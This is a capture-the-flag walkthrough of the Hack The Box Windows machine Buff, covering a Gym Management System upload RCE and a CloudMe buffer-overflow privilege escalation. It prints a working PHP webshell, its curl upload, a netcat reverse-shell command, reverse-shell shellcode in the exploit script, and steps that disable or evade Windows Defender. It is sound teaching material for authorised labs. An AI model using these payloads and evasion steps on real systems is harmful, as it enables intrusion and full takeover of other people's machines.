---
title: HTB: Buff
url: https://0xdf.gitlab.io/2020/11/21/htb-buff.html
date: 2020-11-21T14:45:00+00:00
difficulty: Easy [20]
os: Windows
tags: ctf, hackthebox, htb-buff, nmap, windows, gobuster, gym-management-system, searchsploit, cloudme, chisel, msfvenom, webshell, defender, oscp-like-v2, oscp-like-v1
---

![Buff](https://0xdfimages.gitlab.io/img/buff-cover.png)

Buff is a really good OSCP-style box, where I’ll have to identify a web software running on the site, and exploit it using a public exploit to get execution through a webshell. To privesc, I’ll find another service I can exploit using a public exploit. I’ll update with my own shellcode to make a reverse shell, and set up a tunnel so that I can connect to the service that listens only on localhost. From there, the exploit script returns an administrator shell. In Beyond Root, I’ll step through the first script and perform the exploit manually, and look at how Defender was blocking some of my attempts.

## Box Info

| Name | [Buff](https://hackthebox.com/machines/buff)  [Buff](https://hackthebox.com/machines/buff) [Play on HackTheBox](https://hackthebox.com/machines/buff) |
| --- | --- |
| Release Date | [18 Jul 2020](https://twitter.com/hackthebox_eu/status/1283779257286774790) |
| Retire Date | 21 Nov 2020 |
| OS | Windows Windows |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Buff |
| Radar Graph | Radar chart for Buff |
| First Blood User | 00:05:53[Coaran Coaran](https://app.hackthebox.com/users/183082) |
| First Blood Root | 00:58:18[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [egotisticalSW egotisticalSW](https://app.hackthebox.com/users/94858) |

## Recon

### nmap

`nmap` found two open TCP ports, HTTP (8080) and unknown (7680):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.198
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 15:28 EDT
Nmap scan report for 10.10.10.198
Host is up (0.14s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 14.82 seconds
root@kali# nmap -p 7680,8080 -sC -sV -oA scans/nmap-tcpscans 10.10.10.198
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-18 15:33 EDT
Nmap scan report for 10.10.10.198
Host is up (0.24s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.37 seconds

```

This is a Windows host running Apache with PHP, so I don’t get much more information about the OS.

### Website - TCP 8080

#### Site

The website is for a Gym:

![image-20200719140823734](https://0xdfimages.gitlab.io/img/image-20200719140823734.png)

There are several links to go to Gym information, but nothing interactive except for the login, which didn’t seem vulnerable to SQLI.

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

root@kali# gobuster dir -u http://10.10.10.198:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 40 -o scans/gobuster-root-small-php
===============================================================
Gobuster v3.0.1          
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.198:8080
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/07/19 14:07:12 Starting gobuster
===============================================================
/profile (Status: 301)
/home.php (Status: 200)
/img (Status: 301)
/admin (Status: 301)
/index.php (Status: 200)
/register.php (Status: 200)
/Home.php (Status: 200)
/about.php (Status: 200)
/feedback.php (Status: 200)
/contact.php (Status: 200)
/upload (Status: 301)
/upload.php (Status: 200)
/About.php (Status: 200)
/Contact.php (Status: 200)
/license (Status: 200)
/up.php (Status: 200)
/Index.php (Status: 200)
/edit.php (Status: 200)
/packages.php (Status: 200)
/include (Status: 301)
/licenses (Status: 403)
/facilities.php (Status: 200)
/Register.php (Status: 200)
...[snip]...

```

I actually went down a rabbit hole chasing through these things, but there’s a *ton* of pages. Eventually I realized that given the sheer number of pages, and given things like a license page, this is likely not a custom site for HTB, but some software package.

#### Gym Management System

When I first solved, I couldn’t find the name of the software displayed on the site (I was blind). There were two ways I could think of to find it without seeing it explicitly, and the third way below is the intended path (which is simply reading, but I’ll include the other two as potentially interesting):

1) On all the pages, there’s a copyright and/or link to `Projectworlds.in`. Visiting that page lists tons of projects in PHP (and other languages), some free, others paid. At number 18 is Gym Management System, which fits the name of this box:

[![image-20200719141516090](https://0xdfimages.gitlab.io/img/image-20200719141516090.png)](https://0xdfimages.gitlab.io/img/image-20200719141516090.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200719141516090.png)

2) Seeing that it’s some kind of framework, I could check for a `README.md` file at the web root, and it comes back:

```

gym management system
===================

Gym Management System

This the my gym management system it is made using PHP,CSS,HTML,Jquery,Twitter Bootstrap.
All sql table info can be found in table.sql.

more free projects

click here - https://projectworlds.in

YouTube Demo - https://youtu.be/J_7G_AahgSw

```

3) On `/contact.php`, it clearly says the name of the framework:

[![image-20200719145510366](https://0xdfimages.gitlab.io/img/image-20200719145510366.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200719145510366.png)

#### Exploit

A quick search in `searchsploit` shows there’s an unauthenticated RCE vulnerability in the software:

```

root@kali# searchsploit gym management
--------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                       |  Path
--------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - Unauthenticated Remote Code Execution    | php/webapps/48506.py
--------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

## Shell as shaun

### POC Shell

I’ll grab a copy of the exploit using `searchploit -m php/webapps/48506.py` (and I like to rename it something more descriptive, like `gym_management_rce.py`). I took a look at the script, and it looks like it bypasses filters to upload a webshell, and then runs an infinite loop getting commands from the user, submitting them to the webshell, parsing the results, and printing them.

It uses `print "string"` syntax, so it must be legacy Python. Still, the script works pretty well, at least to get a foothold:

```

root@kali# python gym_management_rce.py http://10.10.10.198:8080/
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG

buff\shaun

C:\xampp\htdocs\gym\upload>

```

You can see that each response starts with the magic bytes for a PNG image file, which is part of the upload filter bypass. I’ll look at the exploit more in Beyond Root.

Because the script is just sending requests to the simple webshell, there’s no state, so I can’t change directories. I can still get `user.txt` from here:

```

C:\xampp\htdocs\gym\upload> type \users\shaun\desktop\user.txt
�PNG

e9ff7f33************************

```

### nc64.exe

This shell gets a bit frustrating after a while, so I upgraded to `nc64.exe`. I started by running `smbserver.py` in the directory where I keep `nc64.exe`:

```

root@kali:/opt/shells/netcat# smbserver.py share . -smb2support -username df -password df
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

For modern Windows, I’ll have to set a username and password.

Now I’ll map that share from Buff:

```

C:\xampp\htdocs\gym\upload> net use \\10.10.14.20\s /u:df df
�PNG

The command completed successfully.

```

Now copy `nc64.exe` to `programdata`, and connect back with a shell:

```

C:\xampp\htdocs\gym\upload> copy \\10.10.14.20\share\nc64.exe \programdata\nc.exe
�PNG

        1 file(s) copied.
        
C:\xampp\htdocs\gym\upload> \programdata\nc.exe -e cmd 10.10.14.20 443

```

At my window with a `nc` listener, I get a shell:

```

root@kali# rlwrap nc -lvnp 443                             
Ncat: Version 7.80 ( https://nmap.org/ncat ) 
Ncat: Listening on :::443                                                                 
Ncat: Listening on 0.0.0.0:443                                                            
Ncat: Connection from 10.10.10.198.                                                       
Ncat: Connection from 10.10.10.198:50577.    
Microsoft Windows [Version 10.0.17134.1550]  
(c) 2018 Microsoft Corporation. All rights reserved.                                      
                                                                                          
C:\xampp\htdocs\gym\upload>

```

Now I have a solid, persistent shell.

## Priv: shaun –> administrator

### Enumeration

#### Netstat

Checking the `netstat` shows two ports listening only on localhost. 3306 is MySQL, which makes sense for the PHP site and XAmpp stack. The other is 8888:

```

C:\>netstat -ano | findstr TCP | findstr ":0"
netstat -ano | findstr TCP | findstr ":0"
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       952
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       5952
  TCP    0.0.0.0:7680           0.0.0.0:0              LISTENING       5772
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4140
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       512
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1032
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1532
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       2196
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       660
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       684
  TCP    10.10.10.198:139       0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:3306         0.0.0.0:0              LISTENING       7088
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       2820
  TCP    [::]:135               [::]:0                 LISTENING       952
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:7680              [::]:0                 LISTENING       5772
  TCP    [::]:8080              [::]:0                 LISTENING       4140
  TCP    [::]:49664             [::]:0                 LISTENING       512
  TCP    [::]:49665             [::]:0                 LISTENING       1032
  TCP    [::]:49666             [::]:0                 LISTENING       1532
  TCP    [::]:49667             [::]:0                 LISTENING       2196
  TCP    [::]:49668             [::]:0                 LISTENING       660
  TCP    [::]:49669             [::]:0                 LISTENING       684

```

I’ll grab the process ID (2820) and grep (or `findstr`) for i in the `tasklist` (the listening process id changes every minute so I’ll have to search quickly):

```

C:\>tasklist /v | findstr 2820
tasklist /v | findstr 2820
CloudMe.exe                   2820                            0     37,444 K Unknown         N/A                                                     0:00:00 N/A 

```

If I dig a bit more in shaun’s home directory, there’s an exe in the Downloads folder:

```

C:\Users\shaun\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

19/07/2020  20:08    <DIR>          .
19/07/2020  20:08    <DIR>          ..
16/06/2020  16:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   9,775,751,168 bytes free

```

#### searchsploit

I’ll throw `cloudme` into `searchsploit` and it returns several vulnerabilities:

```

root@kali# searchsploit cloudme
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                         | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                | windows/local/48499.txt
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                               | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                        | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                                 | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                                    | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                                | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                       | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                                        | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                                     | windows_x86-64/remote/44784.py
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

The version number for the top two (1.11.2) lines up nicely with the EXE name from Buff (`CloudMe_1112.exe`).

### Tunnel

To exploit this service, I’ll need a tunnel from my box to Buff (or I’d have to run the exploit from Buff, but Python isn’t typically installed on Windows). I’ll use my favorite tool for this, [Chisel](https://github.com/jpillora/chisel). I’ll use the same SMB share and copy the Windows binary to where I’m staging in `\programdata`.

```

C:\ProgramData>copy \\10.10.14.20\share\chisel_1.6.0_windows_amd64 c.exe
copy \\10.10.14.20\share\chisel_1.6.0_windows_amd64 c.exe       
        1 file(s) copied.

```

Now I’ll run the Linux binary on Kali in server mode:

```

root@kali:/opt/chisel# ./chisel_1.6.0_linux_amd64 server -p 8000 --reverse
2020/07/19 07:03:48 server: Reverse tunnelling enabled
2020/07/19 07:03:48 server: Fingerprint 34:e6:05:6e:5d:8a:f6:a3:72:78:31:31:f5:f3:01:b1
2020/07/19 07:03:48 server: Listening on 0.0.0.0:8000...

```

Next, from Buff, I’ll run as a client:

```

C:\ProgramData>.\c.exe client 10.10.14.20:8000 R:8888:localhost:8888
.\c.exe client 10.10.14.20:8000 R:8888:localhost:8888           
2020/07/19 20:07:45 client: Connecting to ws://10.10.14.20:8000 
2020/07/19 20:07:45 client: Fingerprint 34:e6:05:6e:5d:8a:f6:a3:72:78:31:31:f5:f3:01:b1
2020/07/19 20:07:45 client: Connected (Latency 1.0595ms)

```

I can see the connection at the server as well:

```

2020/07/19 15:06:13 server: proxy#1:R:0.0.0.0:8888=>localhost:8888: Listening

```

I can see my local box is listening on 8888:

```

root@kali# netstat -ntlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      17843/python        
tcp        0      0 127.0.0.1:38153         0.0.0.0:*               LISTEN      17843/python        
tcp        0      0 127.0.0.1:54261         0.0.0.0:*               LISTEN      17843/python        
tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      13166/./chisel_1.6. 
tcp6       0      0 :::8000                 :::*                    LISTEN      13166/./chisel_1.6. 
tcp6       0      0 127.0.0.1:41643         :::*                    LISTEN      2654/java           
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      2654/java 

```

### Update Exploit

#### Exploit Analysis

It looks like the exploit is a very simple buffer overflow:

```

# Exploit Title: CloudMe 1.11.2 - Buffer Overflow (PoC)
# Date: 2020-04-27
# Exploit Author: Andy Bowden
# Vendor Homepage: https://www.cloudme.com/en
# Software Link: https://www.cloudme.com/downloads/CloudMe_1112.exe
# Version: CloudMe 1.11.2
# Tested on: Windows 10 x86

#Instructions:
# Start the CloudMe service and run the script.

import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS       = b"\x90" * 30

#msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python
payload    = b"\xba\xad\x1e\x7c\x02\xdb\xcf\xd9\x74\x24\xf4\x5e\x33"
payload   += b"\xc9\xb1\x31\x83\xc6\x04\x31\x56\x0f\x03\x56\xa2\xfc"
payload   += b"\x89\xfe\x54\x82\x72\xff\xa4\xe3\xfb\x1a\x95\x23\x9f"
payload   += b"\x6f\x85\x93\xeb\x22\x29\x5f\xb9\xd6\xba\x2d\x16\xd8"
payload   += b"\x0b\x9b\x40\xd7\x8c\xb0\xb1\x76\x0e\xcb\xe5\x58\x2f"
payload   += b"\x04\xf8\x99\x68\x79\xf1\xc8\x21\xf5\xa4\xfc\x46\x43"
payload   += b"\x75\x76\x14\x45\xfd\x6b\xec\x64\x2c\x3a\x67\x3f\xee"
payload   += b"\xbc\xa4\x4b\xa7\xa6\xa9\x76\x71\x5c\x19\x0c\x80\xb4"
payload   += b"\x50\xed\x2f\xf9\x5d\x1c\x31\x3d\x59\xff\x44\x37\x9a"
payload   += b"\x82\x5e\x8c\xe1\x58\xea\x17\x41\x2a\x4c\xfc\x70\xff"
payload   += b"\x0b\x77\x7e\xb4\x58\xdf\x62\x4b\x8c\x6b\x9e\xc0\x33"
payload   += b"\xbc\x17\x92\x17\x18\x7c\x40\x39\x39\xd8\x27\x46\x59"
payload   += b"\x83\x98\xe2\x11\x29\xcc\x9e\x7b\x27\x13\x2c\x06\x05"
payload   += b"\x13\x2e\x09\x39\x7c\x1f\x82\xd6\xfb\xa0\x41\x93\xf4"
payload   += b"\xea\xc8\xb5\x9c\xb2\x98\x84\xc0\x44\x77\xca\xfc\xc6"
payload   += b"\x72\xb2\xfa\xd7\xf6\xb7\x47\x50\xea\xc5\xd8\x35\x0c"
payload   += b"\x7a\xd8\x1f\x6f\x1d\x4a\xc3\x5e\xb8\xea\x66\x9f"

overrun    = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))       

buf = padding1 + EIP + NOPS + payload + overrun 

try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,8888))
        s.send(buf)
except Exception as e:
        print(sys.exc_value)

```

Very simply, it opens a connect to the target on port 8888, it sends a buffer, and it’s done.

The buffer is made up of 1052 bytes of no-op (nop, padding), then the address of a `push esp, ret` gadget, some nops, the payload, and then some more filler.

Without looking at the binary, this suggests that the stack before and after user input is read looks like this:

![image-20200719164839522](https://0xdfimages.gitlab.io/img/image-20200719164839522.png)

Now when the function returns, it will go to to the gadget, which will push `$esp` to the stack (which will now be at the top of the nops before the payload), and then return, moving the instruction pointer, `$eip`, to the nops followed by the payload.

#### Modify Payload

The payload in the script by default looks to be the output of `msfvenom -a x86 -p windows/exec CMD=calc.exe -b '\x00\x0A\x0D' -f python`. Given the four-byte addresses and references to ESP and EIP (as opposed to RSP and RIP), this is a 32-bit program.

I’ll use `msfvenom` to generate my own payload that will return a stageless (can catch with `nc`) reverse tcp shell:

```

root@kali# msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -b '\x00\x0A\x0D' -f python -v payload
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  b""
payload += b"\xb8\x93\xe7\xa2\x0c\xd9\xe9\xd9\x74\x24\xf4\x5a"
payload += b"\x31\xc9\xb1\x52\x31\x42\x12\x03\x42\x12\x83\x51"
payload += b"\xe3\x40\xf9\xa9\x04\x06\x02\x51\xd5\x67\x8a\xb4"
payload += b"\xe4\xa7\xe8\xbd\x57\x18\x7a\x93\x5b\xd3\x2e\x07"
payload += b"\xef\x91\xe6\x28\x58\x1f\xd1\x07\x59\x0c\x21\x06"
payload += b"\xd9\x4f\x76\xe8\xe0\x9f\x8b\xe9\x25\xfd\x66\xbb"
payload += b"\xfe\x89\xd5\x2b\x8a\xc4\xe5\xc0\xc0\xc9\x6d\x35"
payload += b"\x90\xe8\x5c\xe8\xaa\xb2\x7e\x0b\x7e\xcf\x36\x13"
payload += b"\x63\xea\x81\xa8\x57\x80\x13\x78\xa6\x69\xbf\x45"
payload += b"\x06\x98\xc1\x82\xa1\x43\xb4\xfa\xd1\xfe\xcf\x39"
payload += b"\xab\x24\x45\xd9\x0b\xae\xfd\x05\xad\x63\x9b\xce"
payload += b"\xa1\xc8\xef\x88\xa5\xcf\x3c\xa3\xd2\x44\xc3\x63"
payload += b"\x53\x1e\xe0\xa7\x3f\xc4\x89\xfe\xe5\xab\xb6\xe0"
payload += b"\x45\x13\x13\x6b\x6b\x40\x2e\x36\xe4\xa5\x03\xc8"
payload += b"\xf4\xa1\x14\xbb\xc6\x6e\x8f\x53\x6b\xe6\x09\xa4"
payload += b"\x8c\xdd\xee\x3a\x73\xde\x0e\x13\xb0\x8a\x5e\x0b"
payload += b"\x11\xb3\x34\xcb\x9e\x66\x9a\x9b\x30\xd9\x5b\x4b"
payload += b"\xf1\x89\x33\x81\xfe\xf6\x24\xaa\xd4\x9e\xcf\x51"
payload += b"\xbf\xaa\x05\x57\x2b\xc3\x1b\x67\x52\xa8\x95\x81"
payload += b"\x3e\xde\xf3\x1a\xd7\x47\x5e\xd0\x46\x87\x74\x9d"
payload += b"\x49\x03\x7b\x62\x07\xe4\xf6\x70\xf0\x04\x4d\x2a"
payload += b"\x57\x1a\x7b\x42\x3b\x89\xe0\x92\x32\xb2\xbe\xc5"
payload += b"\x13\x04\xb7\x83\x89\x3f\x61\xb1\x53\xd9\x4a\x71"
payload += b"\x88\x1a\x54\x78\x5d\x26\x72\x6a\x9b\xa7\x3e\xde"
payload += b"\x73\xfe\xe8\x88\x35\xa8\x5a\x62\xec\x07\x35\xe2"
payload += b"\x69\x64\x86\x74\x76\xa1\x70\x98\xc7\x1c\xc5\xa7"
payload += b"\xe8\xc8\xc1\xd0\x14\x69\x2d\x0b\x9d\x99\x64\x11"
payload += b"\xb4\x31\x21\xc0\x84\x5f\xd2\x3f\xca\x59\x51\xb5"
payload += b"\xb3\x9d\x49\xbc\xb6\xda\xcd\x2d\xcb\x73\xb8\x51"
payload += b"\x78\x73\xe9" 

```

I changed the payload type (and included `LHOST` and `LPORT` needed for this payload), and I used the `-v payload` to set the output payload variable name so I can just paste it into the script.

### Shell

Now I just run the exploit through the tunnel with `nc` waiting (work with either legacy Python or Python3):

```

root@kali# python3 cloudme-bof.py 

```

At `nc`, I get an administrator shell:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.198.
Ncat: Connection from 10.10.10.198:49683.
Microsoft Windows [Version 10.0.17134.1550]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator

```

And I can grab `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
type root.txt
0e2cf4e5************************

```

## Beyond Root

### Gym Exploit

The vulnerability here is an unauthenticated upload that leads to remote code execution. Basically, I can upload PHP code into a place where it is executed. The comment block at the top of the script lays out nicely how this works in seven bullet points. I thought it might be useful to step through each of these.

> ```

> 1. Access the '/upload.php' page, as it does not check for an authenticated user session.
>
> ```

Visiting `/upload.php` returns an error about a missing parameter `id`, but doesn’t seem to care that there’s no auth:

![image-20200720064955147](https://0xdfimages.gitlab.io/img/image-20200720064955147.png)
> ```

> 2. Set the 'id' parameter of the GET request to the desired file name for the uploaded PHP file.
>   - `upload.php?id=kamehameha`
>   /upload.php:
>      4 $user = $_GET['id'];
>     34       move_uploaded_file($_FILES["file"]["tmp_name"],
>     35       "upload/". $user.".".$ext);
>
> ```

I can fix that error by adding an `id` as a GET parameter. In PHP, `$_GET` doesn’t care if the request type is a GET or a POST, but rather, it just means that PHP will look at the url after a `?`. So visiting `/upload.php?id=0xdf` returns just nothing:

![image-20200720065826526](https://0xdfimages.gitlab.io/img/image-20200720065826526.png)

The rest of the bullets are about bypassing upload filters. There are three to bypass. First, the file extension needs to be an image. I’ll bypass this by giving the file a double extension `.php.png`. It turns out that the program will later give this a filename with the first extension, so I can still get PHP to execute the shell.

> ```

> 3. Bypass the extension whitelist by adding a double extension, with the last one as an acceptable extension (png).
>   /upload.php:
>      5 $allowedExts = array("jpg", "jpeg", "gif", "png","JPG");
>      6 $extension = @end(explode(".", $_FILES["file"]["name"]));
>     14 && in_array($extension, $allowedExts))
>
> ```

Next, I need the content type header to be of an image. This is easy, since I set it:

> ```

> 4. Bypass the file type check by modifying the 'Content-Type' of the 'file' parameter to 'image/png' in the POST request,    and set the 'pupload' parameter to 'upload'.
>      7 if(isset($_POST['pupload'])){
>      8 if ((($_FILES["file"]["type"] == "image/gif")
>     11 || ($_FILES["file"]["type"] == "image/png")
>
> ```

It doesn’t say anything here about it, but the script (and I will do) has the webshell start with the [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) for a PNG image to pass MIME filtering as well.

I can do all of this with `curl`. First, I’ll create the webshell:

```

root@kali# echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\n<?php echo shell_exec($_REQUEST["cmd"]); ?>' > shell.php.png 

```

Now, I’ll use `curl` to upload it with the following arguments:
- `-X POST` - sets the requests type to POST
- Include the `?id=0xdf` at the end of the url; the webshell will be renamed to that id
- `-F 'pupload=upload'` - first form field
- `-F 'file=@shell.php.png'` - second form field, with the value being the contents of the file `shell.php.png`

Because the file I’m uploading has a `.png` extension, `curl` will handle setting the content type header for me. Running this will return nothing:

```

root@kali# curl -X POST 'http://10.10.10.198:8080/upload.php?id=0xdf' -F 'pupload=upload' -F 'file=@shell.php.png'

```

But then I can trigger the webshell:

```

root@kali# curl http://10.10.10.198:8080/upload/0xdf.php?cmd=whoami
PNG

buff\shaun

```

### Fighting with Defender

I did get stuck for a while when I tried to make my webshell using `system()` instead of `echo shell_exec()`. For some reason this fails on upload:

```

root@kali# echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\n<?php system($_REQUEST["cmd"]); ?>' > shell_system.php.png
root@kali# curl -X POST 'http://10.10.10.198:8080/upload.php?id=0xdf' -F 'pupload=upload' -F 'file=@shell_system.php.png' -x http://127.0.0.1:8080
<br />
<b>Warning</b>:  move_uploaded_file(C:\xampp\tmp\php60D2.tmp): failed to open stream: Invalid argument in <b>C:\xampp\htdocs\gym\upload.php</b> on line <b>35</b><br />
<br />
<b>Warning</b>:  move_uploaded_file(): Unable to move 'C:\xampp\tmp\php60D2.tmp' to 'upload/0xdf.php' in <b>C:\xampp\htdocs\gym\upload.php</b> on line <b>35</b><br />

```

The error is talking about a failure to move the temporary file to `upload/0xdf.php`. At first I thought it might be something with the name I was using already existing, but I’d shown myself in experimenting that I am able to overwrite a previous webshell. I tried on a fresh reset, and with a different `id`, but still the same error. My best guess was that the AV on the box is triggering on something in the file, and it turns out to be the word `system`. For example here it is failing:

[![image-20200720213652201](https://0xdfimages.gitlab.io/img/image-20200720213652201.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200720213652201.png)

But if I just take the `m` off the end of `system`, it uploads:

[![image-20200720213719750](https://0xdfimages.gitlab.io/img/image-20200720213719750.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200720213719750.png)

The file is there, albeit broken trying to run a command `syste`:

![image-20200720213803905](https://0xdfimages.gitlab.io/img/image-20200720213803905.png)

I disabled AV from the SYSTEM shell:

```

C:\ProgramData>powershell Set-MpPreference -DisableRealtimeMonitoring $true

```

Now the upload with `system` works fine:

[![image-20200720215933378](https://0xdfimages.gitlab.io/img/image-20200720215933378.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200720215933378.png)

As does the shell:

```

root@kali# curl http://10.10.10.198:8080/upload/asdsadf.php?cmd=whoami
PNG

buff\shaun

```

In chatting with MinatoTW, he pointed out that you can also break the Defender signature by putting a bunch of legit HTML into the shell. We grabbed a bunch of tags from GitHub, and tossed them into the upload that was broken, and now it works fine:

[![image-20200721074446821](https://0xdfimages.gitlab.io/img/image-20200721074446821.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200721074446821.png)